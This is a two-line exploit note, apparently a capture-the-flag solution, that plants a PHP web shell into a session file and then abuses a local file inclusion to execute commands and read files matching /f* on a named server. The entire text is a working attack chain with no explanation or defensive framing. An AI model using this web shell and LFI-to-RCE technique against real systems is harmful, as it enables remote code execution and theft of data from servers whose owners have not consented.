Write `<?php system($_GET['cmd']); ?>` to session
LFI to RCE: http://splitline.tw:8401/?module=/tmp/sess_7096b0f735f7f2b1e5e7f807ca25eb21&cmd=cat%20/f*
